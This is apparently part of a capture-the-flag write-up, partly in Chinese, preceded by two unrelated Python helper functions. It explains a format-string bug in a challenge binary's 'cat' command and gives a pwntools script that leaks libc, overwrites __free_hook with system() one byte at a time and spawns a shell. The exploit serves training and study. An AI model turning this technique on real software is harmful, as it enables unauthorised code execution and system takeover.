def getFileMD5(filePath):
    with open(filePath, "rb") as fp:
        md5obj = hashlib.md5()
        md5obj.update(fp.read())
        file_md5 = md5obj.hexdigest()
        # print(file_md5)
        return file_md5


def bin_to_str(s):
    res = ""
    for i in range(0, len(s), 8):
        res += chr(int('0b'+s[i:i+8], 2))
    return res

程序在cat 2时存在格式化字符串漏洞

可以先leak libc，判断版本后修改free hook到system，因为可以无限次利用，所以可以一个字节一个字节修改这样在rm一个文件内容为/bin/sh的文件1或2时就可以调用system("/bin/sh")，成功get shell

from pwn import *

context.log_level="debug"
p=process("./pwn-4")
p.sendlineafter("> ","vim 2")
p.sendlineafter("> ","%35$p")
p.sendlineafter("> > ","cat 2")
libc_start_main=int(p.recvuntil("\n")[:-1],16)
#gdb.attach(p)
libc_base=libc_start_main-0x7ffb36b34b97+0x7ffb36b13000
free_hook_addr=libc_base+0x003ed8e8
system_addr=libc_base+0x04f440
for i in range(6):
     p.sendlineafter("> ","b"*0x18+p64(free_hook_addr+i))
     p.sendlineafter("> ","vim 2")
     p.sendlineafter("> ","%"+str(system_addr&0xff)+"c%13$hhn")
     p.sendlineafter("> > ","cat 2")
     system_addr=system_addr>>8
gdb.attach(p)
p.sendlineafter("> ","vim 1")
p.sendlineafter("> ","/bin/sh")
p.sendlineafter("> > ","rm 1")
p.interactive()
